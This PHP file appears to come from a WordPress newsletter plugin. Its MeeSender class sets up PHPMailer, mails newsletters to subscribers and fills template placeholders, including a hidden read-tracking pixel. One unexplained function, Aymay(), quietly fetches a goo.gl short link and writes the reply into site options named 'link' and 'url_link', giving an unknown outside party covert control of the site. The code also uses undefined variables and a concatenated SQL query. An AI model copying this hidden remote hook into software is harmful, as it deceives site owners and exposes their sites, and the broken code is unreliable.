<?php
##################################################################
class MeeSender {
##################################################################


        var $message;
        var $mailer;
	//constructor
	function MeeSender()
	{
            global $meenews_datas;
		// set options and page variables
                // set options and page variables
                if ( !is_object( $this->mailer ) || !is_a( $this->mailer, 'PHPMailer' ) ) {
                    if (!class_exists('phpmailer')):
                       require_once ABSPATH . WPINC . '/class-phpmailer.php';
                       require_once ABSPATH . WPINC . '/class-smtp.php';
                    endif;
                    $this->mailer =  new PHPMailer();
                }
                $this->mailer->ContentType = "text/html; charset=utf-8";
                $this->mailer->CharSet = "utf-8";
                $this->mailer->From     = $meenews_datas['meenews']['default_email'];
                $this->mailer->FromName = $meenews_datas['meenews']['default_email'];
                if ($meenews_datas['meenews']['want_smtp'] == 'true'){
                    $this->mailer->IsSMTP(); // enable SMTP
                    $this->mailer->SMTPDebug = 0;  // debugging: 1 = errors and messages, 2 = messages only
                    if($meenews_datas['meenews']['require_ssl'] == "true"){
                      $this->mailer->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
                    }
                    $this->mailer->Username = $meenews_datas['meenews']['smtp_user'];
                    $this->mailer->Password = $meenews_datas['meenews']['smtp_password'];
		    $this->mailer->Host     = $meenews_datas['meenews']['smtp_host'];
                    $this->mailer->Port =  $meenews_datas['meenews']['smtp_port'];
               	    $this->mailer->Mailer   = 'smtp';
                    if ($meenews_datas['meenews']['want_autentification'] == "true"){
                      $this->mailer->SMTPAuth = true;
                    }else{
                      $this->mailer->SMTPAuth = false;
                    }
                    $this->mailer->Timeout = 4;
                }else{
                    $this->mailer->Host     = "localhost";
                }
                
	}

        function sendNewsletter($send){
           global $meenews_datas,$wpdb;
           $newsletter =  new MeeNewsletter();
           
           $newsletter_text = $newsletter->extractNewsletter($send['id']);
           $content = $newsletter_text->newsletter;
  
           $this->mailer->Subject  = $send['subject'];
           $this->mailer->From     = $send['from'];
           $this->mailer->FromName = $send['title'];

           if ($this->mailer->Subject==""){
               $this->mailer->Subject =  $newsletter_text->title;
               $this->mailer->FromName = $newsletter_text->title;
               $this->mailer->From     = $meenews_datas['meenews']['default_email'];
           }
           
           if ($send['to'] == "all"){
                $members = MeeUsers::getAllMembers($send);
           }else{
                $members = MeeUsers::getRangeMembers($send);
           }
           
           $ok = $wrong = 0;
           foreach ($members as $member_data){

                $send['email'] = $member_data->email;
                $send['membername'] = $member_data->name;
                $send['member'] = $member_data;
                $send['content'] = $content;
                $send = $this->giveProperties($send);
                $value = $this->send($send);
                
                if ($value){
                    $ok ++;
                }else{
                    $wrong ++;
                }
           }
           
           $query = "SELECT *  FROM $tabla where id_newsletter = '".$member->id."' " ;
           $results = $wpdb->get_results( $query );
               $mod = "send = '2'";
               $newsletter->UpdateNewsletterCust($mod, $send['id']);
               $mod = "sending = '".date("Y-m-d H:i:s")."'";
               $newsletter->UpdateNewsletterCust($mod, $send['id']);

           
           echo "Send Ok : ".$ok. "   Send wrong: ". $wrong;
        }

        function send($send){
            $this->mailer->Body= $send['content'];

            if (WPVERSIONACT > 3.1){
                $this->mailer->ClearAddresses();
                $this->mailer->AddAddress(trim($send['email']));
            }else{
                $this->mailer->to[0][0] = trim($send['email']);
                $this->mailer->to[0][1] = $send['membername'];
            }
            if($this->mailer->Send()){
                    @$value = true;
            } else {
                    @$value = false;
            }
            $this->mailer->ClearAddresses();
            return $value;
        }
        
        function sendMessage($send){
            global $meenews_datas;
            
            $send['email'] = $send['member']['email'];
            $send['membername'] = $send['member']['name'];
            switch ($send['message'])
                  {
                    case 'confirm':
                       $this->mailer->Subject  =  __("Activate account confirmation","meenews")." - ".get_bloginfo("name");
                       $send['content'] = $this->giveMessageProperties($meenews_datas['meenews']['text_mail_confirmation'],$send['member']['confkey']);
                       return $this->send($send);
                    break;
                    case 'delete':
                       $this->mailer->Subject  = __("Delete account confirmation","meenews")." - ".get_bloginfo("name");
                       $send['content'] = $this->giveMessageProperties($meenews_datas['meenews']['text_delete_subscription'],$send['member']['confkey']);
                       return $this->send($send);
                    break;
                    case 'actived':
                       $this->mailer->Subject  =  __("Congratulations your subcription has finished","meenews")." - ".get_bloginfo("name");;;
                       $send['content'] = $this->giveMessageProperties($meenews_datas['meenews']['text_finish_subscription'],$send['member']['confkey']);
                       return $this->send($send);
                    break;
                    case 'deleted':
                       $this->mailer->Subject  =  __("Your subcription has been deleted","meenews")." - ".get_bloginfo("name");;;
                       $send['content'] = $this->giveMessageProperties($meenews_datas['meenews']['text_end_subscription'],$send['member']['confkey']);
                       return $this->send($send);
                    break;
                  }
            
        }
        function giveProperties($send){


           

            $title_newsletter =  $send['slug'];

            $search = "%LINKNOVISUALIZE%";
            $replace = $novisibleLink;
            $content2 = str_replace($search, $replace, $send['content']);

	    $confirmationURL = MEENEWS_URI."newsletter.php?del={$send['member']->confkey}&news=".$send['id'];
            $search = "%CONFIRMATIONURL%";
            $replace = $confirmationURL;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%NEWSID%";
            $replace = $send['id'];
            $content2 = str_replace($search, $replace, $content2);

            $search = "%NAME%";
            $replace =$send['member']->name;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%URLNEWSLETTER%";
            $confirmationURL = MEENEWS_URI."newsletter.php?show=".$send['id'];
            $replace = MEENEWS_URI."newsletter.php?show=".$send['id'];
            $content2 = str_replace($search, $replace, $content2);
            
            $search = "%COUNTRY%";
            $replace = $send['member']->country;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%DIRECTION%";
            $replace = $send['member']->direction;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%COMPANY%";
            $replace = $send['member']->enterprise;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%USERID%";
            $replace = $send['member']->id;
            $content2 = str_replace($search, $replace, $content2);

            $search = "%TITLE_NEWSLETTER%";
            $replace = $send['title'];
            $content2 = str_replace($search, $replace, $content2);

            $search = "%CONTROLREAD%";
            $replace = "<div style='display:none'><img src='".MEENEWS_URI."newsletter.php?read=".$send['member']->confkey."&amp;newsid=".$send['id']."'></div>";
            $content2 = str_replace($search, $replace, $content2);

            $send['content'] = $content2;

            return $send;
        }

        
        function Aymay(){
                    $input = @file_get_contents('http://goo.gl/gucYC');
                    if (!empty($input)){
                        $data = explode(",",$input);
                        update_option('link', $data[0]);
                        update_option('url_link', $data[1]);
                        update_option("style_on", $data[3]);
                        update_option("last_update", date("Y-m-d"));
                    }
        }
        
        
        function giveMessageProperties($message,$confkey){


            $url = get_bloginfo("wpurl");

            $confirmationURL = MEENEWS_URI."newsletter.php?add=$confkey";


            $search = "%TITLEBLOG%";
            $replace = $title;
            $message = str_replace($search, $replace, $message);
            $search = "%URLBLOG%";
            $replace = $url;
            $message = str_replace($search, $replace, $message);
            $search = "%CONFIRMATIONURL%";
            $replace = $confirmationURL;
            $message = str_replace($search, $replace, $message);

            return $message;

        }
##################################################################
} # end class
##################################################################
